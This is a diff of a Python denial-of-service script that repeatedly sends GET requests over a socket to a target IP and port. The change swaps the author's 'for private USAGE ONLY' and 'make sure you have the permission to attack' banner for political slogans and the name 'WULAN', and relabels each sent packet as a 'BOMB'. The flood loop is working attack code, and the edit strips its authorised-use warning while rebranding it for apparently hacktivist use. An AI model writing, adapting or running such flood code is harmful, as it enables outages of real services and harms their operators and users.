@@ -29,17 +29,18 @@ class ConsoleColors:
     BOLD = '\033[1m'
     
 print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
- ____       ____      _____           _ 
-|  _ \  ___/ ___|    |_   _|__   ___ | |
-| | | |/ _ \___ \ _____| |/ _ \ / _ \| |
-| |_| | (_) |__) |_____| | (_) | (_) | |
-|____/ \___/____/      |_|\___/ \___/|_|
-
-         written by: depascaldc
-         for private USAGE ONLY
-         Make sure you have the
-        permission to attack the
-               given host
+╭┳━┳┳╮╭┳╮╭━━┳━┳╮
+┃┃┃┃┃┃┃┃┃┃╭╮┃┃┃┃
+┃┃┃┃┃╰╯┃╰┫┣┫┃┃┃┃
+╰━┻━┻━━┻━┻╯╰┻┻━╯
+╭━━┳━━┳━━┳━━╮
+╰╮╮┣╮╮┃╯╰┃━━┫
+╭┻╯┣┻╯┃╰╯┣━━┃
+╰━━┻━━┻━━┻━━╯
+         FREE PALESTINE
+         BIRRUH BIDDAM
+         NAFDIKA YAA AQSHA
+        
                
       ''')
     
@@ -77,7 +78,7 @@ def goForDosThatThing():
                     try:
                         dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                         dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
-                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
+                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< BOMB " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SENT BY WULAN AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
                         Count.packetCounter = Count.packetCounter + 1
                     except socket.error:
                         print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
